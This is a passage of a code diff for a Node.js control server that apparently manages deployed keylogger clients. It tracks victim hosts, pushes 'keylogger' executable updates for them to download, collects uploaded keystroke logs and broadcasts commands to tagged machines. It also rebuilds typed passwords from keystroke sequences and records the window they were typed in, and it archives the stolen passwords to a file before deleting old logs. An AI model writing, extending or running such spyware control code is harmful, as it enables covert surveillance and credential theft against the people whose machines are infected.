                             const msg = JSON.parse(data.toString().split('\n')[0]);
                             if (msg.status === 'ok' || msg.action === 'pong') {
                                 const clientId = `${cleanIp}:${port}`;
                                 let client = this.clients.get(clientId);
                                 const now = new Date();
+                                const existingKnown = this.knownClients.get(clientId);
                                 if (!client) {
                                     client = {
                                         id: clientId,
@@ -1184,10 +1537,16 @@ class ClientManager {
                                         uploadEnabled: false,
                                         lastSeen: now,
                                         logDir: alistClient.basePath,
-                                        shouldReconnect: false
+                                        shouldReconnect: false,
+                                        tags: existingKnown?.tags || []
                                     };
                                     this.clients.set(clientId, client);
-                                    this.knownClients.set(clientId, { ip: cleanIp, port, lastSeen: now });
+                                    this.knownClients.set(clientId, {
+                                        ip: cleanIp,
+                                        port,
+                                        lastSeen: now,
+                                        tags: existingKnown?.tags || []
+                                    });
                                     saveKnownClientToDB(clientId, cleanIp, port).catch(e => this.logger.error(e));
                                     this.setupSocketListeners(client);
                                     this.broadcastClientUpdate(client, 'connected');
@@ -1235,6 +1594,234 @@ class ClientManager {
 
     manualConnect(ip, port) {
         return this.tryConnect(ip, port);
+    }
+
+    getClientStatus(ip) {
+        return new Promise((resolve) => {
+            const cleanIp = ip.split('/')[0];
+            const port = 9999;
+            const socket = new net.Socket();
+            let resolved = false;
+
+            const cleanup = (result) => {
+                if (!resolved) {
+                    resolved = true;
+                    socket.removeAllListeners();
+                    socket.destroy();
+                    resolve(result);
+                }
+            };
+
+            const onConnect = () => {
+                socket.write(JSON.stringify({ action: 'get_status' }) + '\n', (err) => {
+                    if (err) return cleanup({ success: false, error: err.message });
+
+                    let responseTimeout = null;
+
+                    responseTimeout = setTimeout(() => {
+                        if (responseTimeout) clearTimeout(responseTimeout);
+                        cleanup({ success: false, error: '获取状态超时' });
+                    }, 5000);
+
+                    const onData = (data) => {
+                        if (responseTimeout) clearTimeout(responseTimeout);
+                        try {
+                            const dataStr = data.toString();
+                            console.log(`[getClientStatus] 收到响应: ${dataStr}`);
+                            const messages = dataStr.split('\n').filter(m => m.trim());
+                            let success = false;
+                            let resultData = {};
+                            
+                            for (const msg of messages) {
+                                try {
+                                    const parsedMsg = JSON.parse(msg);
+                                    console.log(`[getClientStatus] 解析成功:`, parsedMsg);
+                                    
+                                    if (parsedMsg.status === 'ok' && parsedMsg.data && (parsedMsg.type === 'pong' || parsedMsg.type === 'status')) {
+                                        success = true;
+                                        resultData = {
+                                            ip: cleanIp,
+                                            recording: parsedMsg.data.recording,
+                                            uploadEnabled: parsedMsg.data.upload_enabled,
+                                            localPort: parsedMsg.data.local_port,
+                                            logDir: parsedMsg.data.log_dir,
+                                            version: parsedMsg.data.version
+                                        };
+                                        break;
+                                    }
+                                } catch (e) {
+                                    console.log(`[getClientStatus] 解析单条消息失败: ${msg}`, e);
+                                }
+                            }
+
+                            if (success) {
+                                cleanup({
+                                    success: true,
+                                    data: resultData
+                                });
+                            } else {
+                                cleanup({ success: false, error: '响应格式错误' });
+                            }
+                        } catch (e) {
+                            console.log(`[getClientStatus] 处理响应异常:`, e);
+                            cleanup({ success: false, error: '解析响应失败' });
+                        }
+                    };
+
+                    socket.once('data', onData);
+                    socket.once('error', () => cleanup({ success: false, error: '连接错误' }));
+                    socket.once('timeout', () => cleanup({ success: false, error: '连接超时' }));
+                    socket.once('close', () => { if (!resolved) cleanup({ success: false, error: '连接关闭' }); });
+                });
+            };
+
+            socket.setTimeout(5000);
+            socket.once('connect', onConnect);
+            socket.once('error', () => cleanup({ success: false, error: '无法连接到 ' + cleanIp + ':' + port }));
+            socket.once('timeout', () => cleanup({ success: false, error: '连接超时' }));
+            socket.once('close', () => { if (!resolved) cleanup({ success: false, error: '连接关闭' }); });
+
+            socket.connect(port, cleanIp);
+        });
+    }
+
+    async triggerClientUpdate(ip) {
+        const cleanIp = ip.split('/')[0];
+        const port = 9999;
+
+        try {
+            const versionInfo = await this.getActiveVersionInfo();
+            if (!versionInfo.version || !versionInfo.download_url) {
+                return { success: false, error: '没有可用的激活版本，请先在设置中激活一个版本' };
+            }
+
+            return new Promise((resolve) => {
+                const socket = new net.Socket();
+                let resolved = false;
+
+                const cleanup = (result) => {
+                    if (!resolved) {
+                        resolved = true;
+                        socket.removeAllListeners();
+                        socket.destroy();
+                        resolve(result);
+                    }
+                };
+
+                const onConnect = () => {
+                    const updateCommand = {
+                        action: 'update',
+                        version: versionInfo.version,
+                        download_url: versionInfo.download_url
+                    };
+                    console.log(`[triggerClientUpdate] 发送更新命令:`, updateCommand);
+                    socket.write(JSON.stringify(updateCommand) + '\n', (err) => {
+                        if (err) return cleanup({ success: false, error: err.message });
+
+                        let responseTimeout = null;
+
+                        responseTimeout = setTimeout(() => {
+                            if (responseTimeout) clearTimeout(responseTimeout);
+                            cleanup({ success: false, error: '更新响应超时' });
+                        }, 5000);
+
+                        const onData = (data) => {
+                            if (responseTimeout) clearTimeout(responseTimeout);
+                            try {
+                                const dataStr = data.toString();
+                                console.log(`[triggerClientUpdate] 收到响应: ${dataStr}`);
+                                const messages = dataStr.split('\n').filter(m => m.trim());
+                                let success = false;
+                                let version = '';
+                                
+                                for (const msg of messages) {
+                                    try {
+                                        const parsedMsg = JSON.parse(msg);
+                                        console.log(`[triggerClientUpdate] 解析成功:`, parsedMsg);
+                                        
+                                        if (parsedMsg.status === 'ok') {
+                                            success = true;
+                                            version = parsedMsg.data?.version || parsedMsg.data || versionInfo.version;
+                                            break;
+                                        }
+                                    } catch (e) {
+                                        console.log(`[triggerClientUpdate] 解析单条消息失败: ${msg}`, e);
+                                    }
+                                }
+
+                                if (success) {
+                                    cleanup({
+                                        success: true,
+                                        data: {
+                                            ip: cleanIp,
+                                            version
+                                        }
+                                    });
+                                } else {
+                                    cleanup({ success: false, error: '响应格式错误' });
+                                }
+                            } catch (e) {
+                                console.log(`[triggerClientUpdate] 处理响应异常:`, e);
+                                cleanup({ success: false, error: '解析响应失败' });
+                            }
+                        };
+
+                        socket.once('data', onData);
+                        socket.once('error', () => cleanup({ success: false, error: '连接错误' }));
+                        socket.once('timeout', () => cleanup({ success: false, error: '连接超时' }));
+                        socket.once('close', () => { if (!resolved) cleanup({ success: false, error: '连接关闭' }); });
+                    });
+                };
+
+                socket.setTimeout(5000);
+                socket.once('connect', onConnect);
+                socket.once('error', () => cleanup({ success: false, error: '无法连接到 ' + cleanIp + ':' + port }));
+                socket.once('timeout', () => cleanup({ success: false, error: '连接超时' }));
+                socket.once('close', () => { if (!resolved) cleanup({ success: false, error: '连接关闭' }); });
+
+                socket.connect(port, cleanIp);
+            });
+        } catch (error) {
+            return { success: false, error: '获取版本信息失败: ' + error.message };
+        }
+    }
+
+    getActiveVersionInfo() {
+        return new Promise((resolve, reject) => {
+            const options = {
+                hostname: 'localhost',
+                port: CONFIG.httpPort || 3233,
+                path: '/api/update/check',
+                method: 'GET'
+            };
+
+            const req = http.request(options, (res) => {
+                let data = '';
+                res.on('data', chunk => data += chunk);
+                res.on('end', () => {
+                    try {
+                        const result = JSON.parse(data);
+                        if (result.data && result.data.version) {
+                            resolve({
+                                version: result.data.version,
+                                download_url: result.data.download_url
+                            });
+                        } else {
+                            resolve({ version: '', download_url: '' });
+                        }
+                    } catch (e) {
+                        reject(e);
+                    }
+                });
+            });
+
+            req.on('error', reject);
+            req.setTimeout(3000, () => {
+                req.destroy();
+                reject(new Error('获取版本信息超时'));
+            });
+            req.end();
+        });
     }
 }
 
@@ -1284,7 +1871,7 @@ function handleWebSocketConnection(ws, req) {
                     break;
 
                 case 'broadcast_command':
-                    const results = await clientManager.broadcastCommand(data.command);
+                    const results = await clientManager.broadcastCommand(data.command, data.tag);
                     ws.send(JSON.stringify({ type: 'broadcast_result', results }));
                     break;
 
@@ -1326,9 +1913,33 @@ function handleWebSocketConnection(ws, req) {
                     ws.send(JSON.stringify({ type: 'disconnected', clientId: data.clientId }));
                     break;
 
+                case 'subscribe_console':
+                    if (data.clientId) {
+                        clientManager.subscribeConsole(ws, data.clientId);
+                        ws.send(JSON.stringify({ type: 'subscribe_console_result', success: true, clientId: data.clientId }));
+                    } else {
+                        ws.send(JSON.stringify({ type: 'subscribe_console_result', success: false, error: 'clientId 不能为空' }));
+                    }
+                    break;
+
+                case 'unsubscribe_console':
+                    if (data.clientId) {
+                        clientManager.unsubscribeConsole(ws, data.clientId);
+                        ws.send(JSON.stringify({ type: 'unsubscribe_console_result', success: true, clientId: data.clientId }));
+                    } else {
+                        ws.send(JSON.stringify({ type: 'unsubscribe_console_result', success: false, error: 'clientId 不能为空' }));
+                    }
+                    break;
+
                 case 'delete_client':
                     try {
                         await clientManager.deleteKnownClient(data.clientId);
+                        clientManager.broadcastToWeb({
+                            type: 'client_updated',
+                            event: 'deleted',
+                            client: { id: data.clientId }
+                        });
+
                         ws.send(JSON.stringify({
                             type: 'delete_result',
                             success: true,
@@ -1341,6 +1952,32 @@ function handleWebSocketConnection(ws, req) {
                             clientId: data.clientId,
                             error: e.message
                         }));
+                    }
+                    break;
+
+                case 'get_client_status':
+                    try {
+                        const status = await clientManager.getClientStatus(data.ip);
+                        if (status.success) {
+                            ws.send(JSON.stringify({ type: 'client_status_result', ...status }));
+                        } else {
+                            ws.send(JSON.stringify({ type: 'client_status_error', message: status.error }));
+                        }
+                    } catch (e) {
+                        ws.send(JSON.stringify({ type: 'client_status_error', message: e.message }));
+                    }
+                    break;
+
+                case 'update_client':
+                    try {
+                        const result = await clientManager.triggerClientUpdate(data.ip);
+                        if (result.success) {
+                            ws.send(JSON.stringify({ type: 'update_result', ...result }));
+                        } else {
+                            ws.send(JSON.stringify({ type: 'update_error', message: result.error }));
+                        }
+                    } catch (e) {
+                        ws.send(JSON.stringify({ type: 'update_error', message: e.message }));
                     }
                     break;
 
@@ -1358,40 +1995,238 @@ function handleWebSocketConnection(ws, req) {
     });
 }
 
+//自动清理过期日志文件 
+
+
+// 扫描过期日志文件（不删除，仅列出）
+async function scanExpiredLogs() {
+    const now = Date.now();
+    const retentionMs = CONFIG.logRetentionDays * 24 * 60 * 60 * 1000;
+    const expiredFiles = [];
+
+    try {
+        const allFiles = await alistClient.listFiles(CONFIG.alist.basePath, true);
+        const logFiles = allFiles.filter(f => f.filename.endsWith('.log'));
+
+        for (const file of logFiles) {
+            const dateMatch = file.filename.match(/(\d{8})\.log$/);
+            if (!dateMatch) continue;
+
+            const dateStr = dateMatch[1];
+            const year = parseInt(dateStr.substring(0, 4));
+            const month = parseInt(dateStr.substring(4, 6)) - 1;
+            const day = parseInt(dateStr.substring(6, 8));
+            const fileDate = new Date(year, month, day);
+            const fileAge = now - fileDate.getTime();
+
+            if (fileAge > retentionMs) {
+                expiredFiles.push({
+                    filename: file.filename,
+                    date: dateStr           // 格式 20260428，方便展示
+                });
+            }
+        }
+
+        // 按日期降序排列，最新的在前
+        expiredFiles.sort((a, b) => b.date.localeCompare(a.date));
+        return expiredFiles;
+    } catch (err) {
+        logger.error(`[扫描过期日志] 失败: ${err.message}`);
+        throw err;
+    }
+}
+
+//清理选中的日志文件
+async function cleanSelectedLogs(filenames) {
+    const results = [];
+    let totalClean = 0, totalSaved = 0;
+
+    for (const filename of filenames) {
+        const filePath = `${CONFIG.alist.basePath}/${filename}`;
+        try {
+            // 1. 读取文件内容
+            const content = await alistClient.readFile(filePath);
+
+            // 2. 调用密码提取逻辑
+            const extractedPasswords = extractPasswordsFromLog(content, filename);
+
+            // 3. 如果有提取到密码，追加保存到归档文件
+            if (extractedPasswords.length > 0) {
+                let block = `\n--- ${filename} (deleted on ${new Date().toISOString()}) ---\n`;
+                extractedPasswords.forEach((item, index) => {
+                    block += `${index + 1}. 来自: ${item.file}\n`;
+                    block += `窗口: ${item.window || '未知'}\n`;
+                    block += `时间: ${item.timestamp}\n`;
+                    block += `内容: ${item.password}\n`;
+                    block += `原始数据: ${item.rawPassword}\n\n`;
+                });
+
+                const dir = path.dirname(CONFIG.sensitiveLogSavePath);
+                if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+                await fs.promises.appendFile(CONFIG.sensitiveLogSavePath, block, 'utf8');
+                totalSaved += extractedPasswords.length;
+            }
+
+            // 4. 删除源文件
+            await alistClient.deleteFile(filePath);
+            totalClean++;
+            results.push({ filename, success: true });
+        } catch (err) {
+            logger.error(`[清理选中] 处理 ${filename} 失败: ${err.message}`);
+            results.push({ filename, success: false, error: err.message });
+        }
+    }
+
+    logger.info(`[清理选中] 完成：删除 ${totalClean} 个，保存 ${totalSaved} 条密码`);
+    resetExtractionCache();
+    return { results, totalClean, totalSaved };
+}
+
+// 一键清理所有过期日志
+async function cleanExpiredLogs() {
+    const expiredFiles = await scanExpiredLogs();          // 扫描过期文件列表
+    if (expiredFiles.length === 0) {
+        logger.info('[一键清理] 没有过期日志需要清理');
+        return { totalClean: 0, totalSaved: 0 };
+    }
+    const filenames = expiredFiles.map(f => f.filename);   // 提取文件名
+    const result = await cleanSelectedLogs(filenames);     // 复用批量清理逻辑
+    logger.info(`[一键清理] 完成，删除 ${result.totalClean} 个文件，保存 ${result.totalSaved} 条密码`);
+    return result;
+}
+
 // ========== HTTP API 路由 ==========
 
 app.get('/api/clients', (req, res) => {
     res.json(clientManager.getAllClients());
 });
 
+app.post('/api/clients/:clientId/tags', asyncHandler(async (req, res) => {
+    const clientId = req.params.clientId;
+    const { tags } = req.body;
+    if (!Array.isArray(tags)) {
+        return res.status(400).json({ success: false, error: '标签必须是字符串数组' });
+    }
+    const normalizedTags = tags.map(tag => String(tag || '').trim()).filter(tag => tag);
+    const knownClient = clientManager.knownClients.get(clientId);
+    if (!knownClient) {
+        return res.status(404).json({ success: false, error: '客户端不存在' });
+    }
+    knownClient.tags = normalizedTags;
+    await updateKnownClientTags(clientId, normalizedTags);
+
+    const onlineClient = clientManager.clients.get(clientId);
+    if (onlineClient) {
+        onlineClient.tags = normalizedTags;
+        clientManager.broadcastClientUpdate(onlineClient, 'updated');
+    } else {
+        clientManager.broadcastClientUpdate({
+            id: clientId,
+            ip: knownClient.ip,
+            port: knownClient.port,
+            status: 'offline',
+            recording: false,
+            uploadEnabled: false,
+            lastSeen: knownClient.lastSeen,
+            tags: normalizedTags
+        }, 'updated');
+    }
+
+    res.json({ success: true, message: '标签已保存', tags: normalizedTags });
+}));
+
+app.get('/api/update/get_version', asyncHandler(async (req, res) => {
+    const cacheKey = 'version_list';
+    try {
+        // 1. 先从 Alist 版本目录拉取文件
+        const allFiles = await alistClient.listFiles(CONFIG.alist.versionPath, true);
+        
+        const keyloggerFiles = allFiles.filter(file => 
+            file.filename.toLowerCase().includes('keylogger') && 
+            (file.filename.endsWith('.exe') || file.filename.endsWith('.zip'))
+        );
+
+        const versions = [];
+        const existingRows = await executeWithRetry(
+            'SELECT version, is_active FROM client_versions',
+            []
+        );
+        const activeVersionMap = new Map(existingRows.map(row => [row.version, !!row.is_active]));
+
+        for (const file of keyloggerFiles) {
+            const versionMatch = file.filename.match(/v(\d+\.\d+\.\d+)/i);
+            if (versionMatch) {
+                const version = versionMatch[1];
+                const downloadUrl = `${alistClient.baseUrl}/d${CONFIG.alist.versionPath}/${encodeURIComponent(file.filename)}`;
+                
+                // 尝试写入数据库（幂等操作）
+                await executeWithRetry(
+                    'INSERT IGNORE INTO client_versions (version, download_url, is_active) VALUES (?, ?, FALSE)',
+                    [version, downloadUrl]
+                );
+
+                versions.push({
+                    version,
+                    downloadUrl,
+                    filename: file.filename,
+                    is_active: activeVersionMap.get(version) || false
+                });
+            }
+        }
+
+        versions.sort((a, b) => compareVersions(b.version, a.version));
+
+        // 2. 缓存起来并返回
+        versionCache.set(cacheKey, JSON.parse(JSON.stringify(versions)));
+        logger.info(`版本列表生成完成，共 ${versions.length} 个版本`);
+        return res.json({
+            code: 200,
+            data: { versions, count: versions.length }
+        });
+    } catch (error) {
+        // 3. Alist 出错时，先尝试使用缓存，缓存也没有就返回空
+        logger.warn(`从Alist获取版本列表失败，尝试使用缓存`, { error: error.message });
+        const cached = versionCache.get(cacheKey);
+        if (cached && cached.length) {
+            return res.json({
+                code: 200,
+                data: { versions: cached, count: cached.length }
+            });
+        }
+        // 无缓存则返回空列表
+        return res.json({
+            code: 200,
+            data: { versions: [], count: 0 }
+        });
+    }
+}));
+
 app.get('/api/update/check', asyncHandler(async (req, res) => {
     try {
         // 首先检查数据库中是否有激活的版本
         const activeVersionRows = await executeWithRetry(
-            'SELECT version, download_url, force_update FROM client_versions WHERE is_active = TRUE LIMIT 1'
-        );
+            'SELECT version, download_url FROM client_versions WHERE is_active = TRUE LIMIT 1'
+    );
         
         if (activeVersionRows.length > 0) {
             const activeVersion = activeVersionRows[0];
-            logger.info(`返回数据库激活版本: ${activeVersion.version}`);
+            logger.debug(`返回数据库激活版本: ${activeVersion.version}`);
             return res.json({ 
                 code: 200, 
                 data: { 
                     version: activeVersion.version, 
-                    download_url: activeVersion.download_url,
-                    force_update: activeVersion.force_update
+                    download_url: activeVersion.download_url
                 } 
             });
         }
         
         // 数据库中没有激活版本，返回空版本（通知客户端无需更新）
-        logger.info('数据库中没有激活版本，返回空版本');
+        logger.debug('数据库中没有激活版本，返回空版本');
         return res.json({
             code: 200,
             data: {
                 version: '',
                 download_url: '',
-                force_update: false
             }
         });
         
@@ -1408,6 +2243,100 @@ app.get('/api/update/check', asyncHandler(async (req, res) => {
     }
 }));
 
+app.post('/api/update/deactivate', asyncHandler(async (req, res) => {
+    try {
+        await executeWithRetry(
+            'UPDATE client_versions SET is_active = FALSE WHERE is_active = TRUE'
+        );
+        versionCache.delete('version_list');
+        logger.info('已取消所有激活版本');
+        res.json({ code: 200, message: '取消激活成功' });
+    } catch (error) {
+        logger.error('取消激活失败', { error: error.message });
+        res.json({ code: 500, message: '取消激活失败' });
+    }
+}));
+
+app.post('/api/update/set_version', asyncHandler(async (req, res) => {
+    try {
+        const { version } = req.body;
+        if (!version) {
+            return res.json({ code: 400, message: '版本号不能为空' });
+        }
+        
+        const existingRows = await executeWithRetry(
+            'SELECT id FROM client_versions WHERE version = ?',
+            [version]
+        );
+        if (existingRows.length === 0) {
+            return res.json({ code: 404, message: '版本不存在' });
+        }
+        
+        let connection;
+        try {
+            connection = await pool.getConnection();
+            await connection.beginTransaction();
+            
+            // 将所有版本设置为非激活
+            await connection.execute('UPDATE client_versions SET is_active = FALSE WHERE is_active = TRUE');
+            // 将指定版本设置为激活（不再包含 force_update）
+            await connection.execute(
+                'UPDATE client_versions SET is_active = TRUE WHERE version = ?',
+                [version]
+            );
+            
+            await connection.commit();
+            logger.info(`设置版本 ${version} 为激活状态`);
+            
+            versionCache.delete('version_list');
+            
+            res.json({ code: 200, message: '版本设置成功', data: { version } });
+        } catch (txError) {
+            if (connection) await connection.rollback();
+            throw txError;
+        } finally {
+            if (connection) connection.release();
+        }
+    } catch (error) {
+        logger.error('设置版本失败', { error: error.message });
+        res.status(500).json({ code: 500, message: '数据库操作失败' });
+    }
+}));
+
+// 版本搜索接口 - 实时更新搜索记录到数据库
+app.post('/api/update/search_version', asyncHandler(async (req, res) => {
+    try {
+        const { keyword } = req.body;
+        if (typeof keyword !== 'string') {
+            return res.status(400).json({ code: 400, message: '搜索关键词必须是字符串' });
+        }
+
+        // 创建搜索历史表（如果不存在）
+        await executeWithRetry(`
+            CREATE TABLE IF NOT EXISTS version_search_history (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                keyword VARCHAR(255) NOT NULL,
+                search_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                INDEX idx_keyword (keyword),
+                INDEX idx_search_time (search_time)
+            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
+        `, []);
+
+        // 记录搜索操作
+        await executeWithRetry(
+            'INSERT INTO version_search_history (keyword) VALUES (?)',
+            [keyword]
+        );
+
+        logger.debug(`版本搜索记录: "${keyword}"`);
+        res.json({ code: 200, message: '搜索记录已保存' });
+    } catch (error) {
+        logger.error('版本搜索记录失败', { error: error.message });
+        res.status(500).json({ code: 500, message: '搜索记录失败' });
+    }
+}));
+
+
 // 版本号比较函数
 function compareVersions(v1, v2) {
     const v1Parts = v1.split('.').map(Number);
@@ -1421,14 +2350,46 @@ function compareVersions(v1, v2) {
 }
 
 app.get('/api/logs', asyncHandler(async (req, res) => {
-    const allFiles = await alistClient.listFiles(alistClient.basePath);
+    // 始终强制刷新，实时获取最新文件列表
+    let allFiles = [];
+    for (let attempt = 0; attempt < 3; attempt++) {
+        try {
+            allFiles = await alistClient.listFiles(alistClient.basePath, true);
+            break;
+        } catch (error) {
+            if (attempt < 2) {
+                logger.warn(`获取文件列表失败 (${attempt + 1}/3)，${(attempt + 1) * 1000}ms 后重试`);
+                await new Promise(resolve => setTimeout(resolve, (attempt + 1) * 1000));
+            } else {
+                logger.error(`获取文件列表失败，已达最大重试次数`, { error: error.message });
+                return res.status(500).json({ error: '文件列表获取失败，请稍后重试' });
+            }
+        }
+    }
     res.json(allFiles);
 }));
 
 app.get('/api/clients/:clientId/logs', asyncHandler(async (req, res) => {
     const clientInfo = getClientInfoById(req.params.clientId);
     if (!clientInfo.exists) return res.status(404).json({ error: '客户端不存在' });
-    const allFiles = await alistClient.listFiles(clientInfo.logDir);
+    
+    // 获取客户端日志列表 
+    let allFiles = [];
+    for (let attempt = 0; attempt < 3; attempt++) {
+        try {
+            allFiles = await alistClient.listFiles(clientInfo.logDir, true);
+            break;
+        } catch (error) {
+            if (attempt < 2) {
+                logger.warn(`获取客户端 ${req.params.clientId} 文件列表失败 (${attempt + 1}/3)，${(attempt + 1) * 1000}ms 后重试`);
+                await new Promise(resolve => setTimeout(resolve, (attempt + 1) * 1000));
+            } else {
+                logger.error(`获取客户端 ${req.params.clientId} 文件列表失败，已达最大重试次数`, { error: error.message });
+                return res.status(500).json({ error: '文件列表获取失败，请稍后重试' });
+            }
+        }
+    }
+    
     const clientFiles = allFiles.filter(file => file.filename.startsWith(clientInfo.ip + '_'));
     res.json(clientFiles);
 }));
@@ -1490,6 +2451,27 @@ app.delete('/api/clients/:clientId/logs/:filename', asyncHandler(async (req, res
     await alistClient.deleteFile(filePath);
     logger.info(`日志文件已删除: ${filePath}`, { clientId: req.params.clientId, user: req.user || 'unknown' });
     res.json({ success: true, message: '文件已删除' });
+}));
+
+// 扫描过期日志（仅预览，不删除）
+app.get('/api/maintenance/scan-expired-logs', asyncHandler(async (req, res) => {
+    logger.info('收到扫描过期日志请求', { user: req.user });
+    const files = await scanExpiredLogs();
+    res.json({ success: true, files });
+}));
+
+// 清理选中的日志
+app.post('/api/maintenance/clean-selected-logs', asyncHandler(async (req, res) => {
+    const { filenames } = req.body;
+    if (!Array.isArray(filenames) || filenames.length === 0) {
+        return res.status(400).json({ success: false, error: 'filenames 必须是非空数组' });
+    }
+
+    logger.info(`用户选择清理 ${filenames.length} 个过期日志`, { user: req.user, filenames });
+    auditLogger.info('用户选择性清理过期日志', { user: req.user, action: 'clean_selected_logs', filenames });
+
+    const { results, totalClean, totalSaved } = await cleanSelectedLogs(filenames);
+    res.json({ success: true, results, totalClean, totalSaved });
 }));
 
 // 批量删除日志：增加预检并发控制
@@ -1577,6 +2559,46 @@ app.post('/api/batch/command', asyncHandler(async (req, res) => {
     res.json({ success: true, total: clientIds.length, successCount, results });
 }));
 
+app.post('/api/clients/:clientId/logs/info', asyncHandler(async (req, res) => {
+    const clientId = req.params.clientId;
+    const command = { action: 'get_logs_info' };
+    
+    auditLogger.info(`获取客户端日志文件信息: ${clientId}`, { user: req.user });
+    const result = await clientManager.sendCommand(clientId, command);
+    
+    if (!result.success) {
+        return res.status(400).json({ success: false, error: result.error || '发送命令失败' });
+    }
+    
+    res.json({ success: true, message: '命令已发送' });
+}));
+
+app.post('/api/clients/:clientId/logs/delete', asyncHandler(async (req, res) => {
+    const clientId = req.params.clientId;
+    const { file } = req.body;
+    
+    if (!file) {
+        return res.status(400).json({ success: false, error: '文件名不能为空' });
+    }
+    
+    // 验证文件名格式
+    const filenameRegex = /^\d+\.\d+\.\d+\.\d+_\d{8}\.log$/;
+    if (!filenameRegex.test(file)) {
+        return res.status(400).json({ success: false, error: '文件名格式不正确，必须是 IP_YYYYMMDD.log 格式' });
+    }
+    
+    const command = { action: 'delete_log', file };
+    
+    auditLogger.info(`删除客户端日志文件: ${clientId}/${file}`, { user: req.user });
+    const result = await clientManager.sendCommand(clientId, command);
+    
+    if (!result.success) {
+        return res.status(400).json({ success: false, error: result.error || '发送命令失败' });
+    }
+    
+    res.json({ success: true, message: '命令已发送' });
+}));
+
 app.post('/api/upload/:ip', express.raw({ type: 'text/plain', limit: CONFIG.uploadSizeLimit }), asyncHandler(async (req, res) => {
     const ip = req.params.ip;
     let clientId = Array.from(clientManager.clients.keys()).find(id => id.startsWith(ip));
@@ -1589,17 +2611,6 @@ app.post('/api/upload/:ip', express.raw({ type: 'text/plain', limit: CONFIG.uplo
     logger.info(`文件上传成功: ${filename}`, { ip, size: req.body.length });
     res.json({ success: true, message: '文件上传成功' });
 }));
-
-// ========== 密码提取相关 ==========
-const extractionCache = {
-    lastExtractTime: 0,
-    passwords: [],
-    fileMTimes: new LRUCache({
-        max: 500,
-        ttl: 1000 * 60 * 60,
-        updateAgeOnGet: true
-    })
-};
 
 // ========== 密码提取核心函数 ==========
 
@@ -1636,83 +2647,50 @@ function parsePasswordFromSequence(sequence, initialShift, initialCtrl, initialA
     };
 
     for (const item of sequence) {
+        // 更新修饰键状态
         if (item === '[LSHIFT]' || item === '[RSHIFT]') { shift = true; continue; }
         if (item === '[LCONTROL]' || item === '[RCONTROL]') { ctrl = true; continue; }
         if (item === '[LALT]' || item === '[RALT]') { alt = true; continue; }
         if (item === '[CAPSLOCK]') { caps = !caps; continue; }
-        
-        // 处理退格键
+
+        // 退格键处理
         if (item === '[BACKSPACE]' || item === '[BACK]') {
-            if (result.length > 0) {
-                result.pop();
-            }
-            // 重置修饰键状态
-            shift = false;
-            ctrl = false;
-            alt = false;
+            if (result.length > 0) result.pop();
+            shift = false; ctrl = false; alt = false;
             continue;
         }
-        
-        // 忽略 [TAB] 键，不分割密码
-        if (item === '[TAB]') {
-            // 重置修饰键状态
-            shift = false;
-            ctrl = false;
-            alt = false;
+
+        // Tab 键和 Enter 键：在这里仅重置修饰键，不添加到密码中（因为密码提交由 Enter 触发）
+        if (item === '[TAB]' || item === '[ENTER]' || item === '[RETURN]') {
+            shift = false; ctrl = false; alt = false;
             continue;
         }
-        
+
+        // 其他功能键忽略
         if (item.startsWith('[') && item.endsWith(']')) {
-            // 遇到其他功能键时，重置修饰键状态
-            shift = false;
-            ctrl = false;
-            alt = false;
-            continue;
-        }
-        if (ctrl || alt) {
-            // Ctrl/Alt 组合键不视为密码输入，重置状态
-            shift = false;
-            ctrl = false;
-            alt = false;
+            shift = false; ctrl = false; alt = false;
             continue;
         }
 
-        // 忽略换行符，只处理实际的密码字符
-        if (item === '\n') {
-            continue;
-        }
-
-        let char = item;
+        // 处理普通字符（长度1）
         if (item.length === 1) {
+            let char = item;
             const code = item.charCodeAt(0);
-            const isUpperCase = code >= 65 && code <= 90;
-            const isLowerCase = code >= 97 && code <= 122;
-            const isLetter = isUpperCase || isLowerCase;
-            
-            // 大写字母表示需要按下 shift，小写字母表示不需要
-            if (isUpperCase) {
-                // 对于大写字母，强制使用 shift 状态
-                if (isLetter) {
-                    char = item.toUpperCase();
-                } else if (shiftMap[item]) {
-                    char = shiftMap[item];
-                }
-            } else if (isLowerCase) {
-                // 对于小写字母，不使用 shift 状态
-                if (isLetter) {
-                    char = item.toLowerCase();
-                }
+            const isUpperCaseLetter = code >= 65 && code <= 90;   // A-Z
+            const isLowerCaseLetter = code >= 97 && code <= 122; // a-z
+
+            if (isUpperCaseLetter || isLowerCaseLetter) {
+                // 决定最终大小写：大写条件 = (shift被按下 XNOR caps开启?) 实际上：仅当 shift 与 caps 一个生效时为大写
+                const makeUpper = shift ^ caps;
+                char = makeUpper ? item.toUpperCase() : item.toLowerCase();
             } else {
-                // 对于数字和特殊字符，使用实际的 shift 状态
-                // 不再根据前一个字符是否是大写字母来决定
-                if (shift && shiftMap[item]) {
-                    char = shiftMap[item];
-                }
+                // 数字和符号：不翻译 SHIFT 键的影响
             }
+
+            result.push(char);
         }
-        result.push(char);
-        
-        // 重置修饰键状态，让修饰键只影响下一个按键
+
+        // 字符输入后重置修饰键（Shift/Alt/Ctrl 通常只影响紧接着的一个按键）
         shift = false;
         ctrl = false;
         alt = false;
@@ -1750,8 +2728,8 @@ function extractPasswordsFromLog(content, filename) {
                 passwords.push({
                     file: filename,
                     timestamp: timestamp || '未知',
-                    password: parsed,
-                    rawPassword: rawSequence.join(''),
+                    password: parsed || '',       // 防止 undefined
+                    rawPassword: rawSequence.join('').replace(/\n/g, '↵'),
                     window: currentWindow || '未知窗口'
                 });
             }
@@ -1857,117 +2835,238 @@ function extractPasswordsFromLog(content, filename) {
     saveCurrentPassword();
     return passwords;
 }
+function parseSensitiveSaves(content) {
+    const passwords = [];
+    // 去掉文件开头的空白字符（包括换行），避免第一个块被误判为空而丢失
+    const trimmedContent = content.replace(/^\s+/, '');
+    // 按 "--- " 标题行分割，并过滤掉空块
+    const blocks = trimmedContent.split(/\n(?=--- )/).filter(block => block.trim());
 
+    for (const block of blocks) {
+        const fileMatch = block.match(/来自:\s*(.+)$/m);
+        const winMatch = block.match(/窗口:\s*(.+)$/m);
+        const timeMatch = block.match(/时间:\s*(.+)$/m);
+        const pwdMatch = block.match(/内容:\s*(.+)$/m);
+        const rawMatch = block.match(/原始数据:\s*(.+)$/m);
+
+        if (pwdMatch && pwdMatch[1].trim()) {
+            passwords.push({
+                file: fileMatch ? fileMatch[1].trim() : '维护记录',
+                timestamp: timeMatch ? timeMatch[1].trim() : '未知',
+                password: pwdMatch[1].trim(),
